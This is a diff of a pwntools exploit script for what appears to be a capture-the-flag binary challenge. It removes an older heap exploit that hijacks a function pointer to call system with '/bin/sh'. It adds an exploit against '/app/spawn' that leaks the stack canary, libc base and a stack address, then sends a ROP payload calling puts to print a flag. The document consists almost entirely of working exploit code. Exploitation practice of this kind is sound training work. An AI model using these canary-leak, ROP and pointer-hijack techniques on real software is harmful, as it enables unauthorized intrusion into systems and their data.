@@ -1,5 +1,3 @@
-    #!/usr/bin/env python2
-# -*- coding: utf-8 -*
 import re
 import os
 from pwn import *
@@ -23,53 +21,43 @@ def debug(breakpoint=''):
     gdbscript += 'directory %sstdlib/\n' % glibc_dir
     gdbscript += 'directory %slibio/\n' % glibc_dir
     gdbscript += 'directory %self/\n' % glibc_dir
-    gdbscript += 'set follow-fork-mode parent\n'
+    gdbscript += 'set follow-fork-mode child\n'
     elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
     gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
     gdb.attach(p, gdbscript)
     time.sleep(1)
 
-elf = ELF('./zoo')
-context(arch = elf.arch ,log_level = 'debug', os = 'linux')
 
-def add_animal(name):
-    sla("> ", "1")
-    sla("2) Panda", "1")
-    sa("Name of animal?", name)
+offset = 74
+elf = ELF("/app/spawn")
+libc = ELF("./libc.so.6")
+context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
 
-def remove_animal(idx):
-    sla("> ", "2")
-    sla("Zone number? (0-9)", str(idx))
+p = process("/app/spawn")
+#debug(0x1213)
+sa("vironment variable:", "a" * 9)
+ru("a" * 9)
+canary = u64(b'\x00' + rc(7))
+log.success(hex(canary))
 
-def report_name(idx):
-    sla("> ", "3")
-    sla("Zone number? (0-9)", str(idx))
+sa("vironment variable:", "a" * 0x18)
+ru("a" * 0x18)
+libc.address = u64(rc(6) + b'\x00\x00') - 0x280d0
+log.success(hex(libc.address))
 
+sa("vironment variable:", "a" * 0x20)
+ru("a" * 0x20)
+stack_leak = u64(rc(6) + b'\x00\x00')
+stack_end = stack_leak - (stack_leak & 0xfff) + 0x2000
+flag_addr = stack_end - offset
+log.success(hex(flag_addr))
 
-p = process("./zoo")
+rop = ROP(libc)
 
-add_animal("a" * 0x18) #0
-add_animal("/bin/sh;/bin/sh;/bin/sh\x00") #1
-add_animal("b" * 0x18) #2
-add_animal("c" * 0x18) #3
+payload = flat({
+    0x08: canary,
+    0x18: [rop.rdi[0], flag_addr, libc.sym["puts"]]
+})
 
-remove_animal(0)
-remove_animal(1)
-remove_animal(2)
-remove_animal(3)
-
-sys_addr = 0x401120
-add_animal(p64(sys_addr) + b"d" * 8 + b'\x20') #0
-
-debug()
-report_name(2)
-
-
-# get_shell_addr = 0x401276
-# add_animal(0x10, p64(get_shell_addr)) #0
-# debug()
-
-
+sa("ter feedback for this challenge below", payload)
 p.interactive()
-
-
